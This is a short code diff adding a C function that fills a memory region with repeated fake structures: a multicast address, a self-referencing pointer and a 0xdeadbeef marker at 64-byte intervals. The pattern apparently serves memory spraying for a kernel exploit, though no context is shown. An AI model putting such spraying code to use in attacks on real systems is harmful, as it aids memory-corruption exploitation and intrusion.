@@ -1,0 +1,14 @@
+void fill(void*addr, size_t size) {
+  size_t i = 0;
+  size_t start = (size_t)addr;
+  for (i = start; i < start + size; i+= 64) {
+    *(uint64_t*)i = 0;
+    *(uint32_t*)(i + 8)    = inet_addr("224.0.0.224");
+    *(uint32_t*)(i + 0xc) = 0;
+    *(uint32_t*)(i + 0x10) = 2;
+    *(uint32_t*)(i + 0x14) = (uint32_t)i;
+    *(uint64_t*)(i + 0x18) = 0;
+    *(uint64_t*)(i + 0x20) = 0;
+    *(uint64_t*)(i + 0x28) = 0xdeadbeefdeadbeef;
+  }
+}
